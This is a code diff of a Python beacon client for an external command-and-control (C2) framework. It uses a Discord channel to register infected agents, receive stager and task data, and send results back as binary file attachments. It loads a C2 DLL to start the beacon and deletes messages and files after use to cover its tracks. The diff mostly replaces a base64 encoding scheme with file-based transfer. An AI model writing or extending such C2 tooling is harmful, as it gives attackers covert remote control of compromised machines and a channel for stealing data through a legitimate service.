@@ -8,7 +8,6 @@ from ctypes import *
 from ctypes.wintypes import *
 import uuid
 
-
 # Discord bot token
 DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
 CHANNEL_ID = os.getenv('COMMAND_CHANNEL_ID')
@@ -19,20 +18,28 @@ respKeyName = beaconId + ':RespForYou'
 
 # Initialize Discord client
 intents = discord.Intents.all()
-
 client = discord.Client(intents=intents)
 
+maxlen = 1024 * 1024
+lib = CDLL('c2file.dll')
+
 #####################
-# Encoder functions #
+# Helper Functions  #
 #####################
 
-def encode(data):
-    data = base64.b64encode(data)
-    return urllib.parse.quote_plus(data)[::-1]
+def writeToBinFile(data, fileName):
+    """
+    Write data to a .bin file.
+    """
+    with open(fileName, 'wb') as f:
+        f.write(data)
 
-def decode(data):
-    data = urllib.parse.unquote(data[::-1])
-    return base64.b64decode(data)
+def readFromBinFile(fileName):
+    """
+    Read binary data from a .bin file.
+    """
+    with open(fileName, 'rb') as f:
+        return f.read()
 
 #######################
 # Transport functions #
@@ -44,45 +51,54 @@ async def prepTransport():
 
 async def sendData(data):
     """
-    Function to send data to the external C2. Data must be encoded
-    before transmission.
+    Function to send binary data to the external C2 as a .bin file.
     """
-    channel = client.get_channel(CHANNEL_ID)
-    encoded_data = encode(data)
-    await channel.send(f'{respKeyName}: {encoded_data}')
-    print(f'Sent {len(data)} bytes to Discord.')
+    channel = client.get_channel(int(CHANNEL_ID))
+    if channel:
+        fileName = f'{respKeyName}.bin'
+        
+        # Write data to a binary file
+        writeToBinFile(data, fileName)
+
+        # Send the binary file to the Discord channel
+        file = discord.File(fileName, filename=fileName)
+        await channel.send(file=file)
+        print(f'Sent {len(data)} bytes to Discord.')
+        os.remove(fileName)  # Clean up after sending
 
 async def recvData():
     """
-    Function to receive data from the external C2.
-    Decodes data received from Discord channel messages.
+    Function to receive binary data from the external C2 by reading .bin files from Discord messages.
     """
-    channel = client.get_channel(CHANNEL_ID)
-    while True:
-        async for message in channel.history(limit=10):
-            if taskKeyName in message.content:
-                task_msg = message.content.split(': ')[1]
-                decoded_data = decode(task_msg.encode())
-                await message.delete()
-                return [decoded_data]
-        sleep(5)
+    channel = client.get_channel(int(CHANNEL_ID))
+    if channel:
+        while True:
+            async for message in channel.history(limit=10):
+                for attachment in message.attachments:
+                    if attachment.filename.startswith(f'{taskKeyName}'):
+                        # Download the binary file
+                        fileName = attachment.filename
+                        await attachment.save(fileName)
+                        
+                        # Read the binary data from the file
+                        data = readFromBinFile(fileName)
+                        os.remove(fileName)  # Clean up the file
+                        await message.delete()  # Delete the message after receiving the file
+                        return [data]
+            sleep(5)
 
 async def registerClient():
     """
     Function to register a new beacon with the C2.
     """
-    channel = client.get_channel(CHANNEL_ID)
+    channel = client.get_channel(int(CHANNEL_ID))
     keyName = f"AGENT:{beaconId}"
     await channel.send(f'{keyName}')
-    print(f"[+] Registered new agent {keyName}")
+    print(f"[+] Registered new {keyName}")
 
 #####################
 # Interaction logic #
 #####################
-
-maxlen = 1024 * 1024
-
-lib = CDLL('c2file.dll')
 
 lib.start_beacon.argtypes = [c_char_p, c_int]
 lib.start_beacon.restype = POINTER(HANDLE)
@@ -114,10 +130,10 @@ async def go():
     await registerClient()
     print("Waiting for stager...")  # DEBUG
 
-    # Send READY2INJECT message to indicate readiness
-    channel = client.get_channel(CHANNEL_ID)
-    await channel.send("READY2INJECT")  # Notify the server that we are ready
-    print("Sent READY2INJECT message to the server.")
+    # # Send READY2INJECT message to indicate readiness
+    # channel = client.get_channel(int(CHANNEL_ID))
+    # await channel.send("READY2INJECT")  # Notify the server that we are ready
+    # print("Sent READY2INJECT message to the server.")
 
     # Wait for stager data
     p = await recvData()
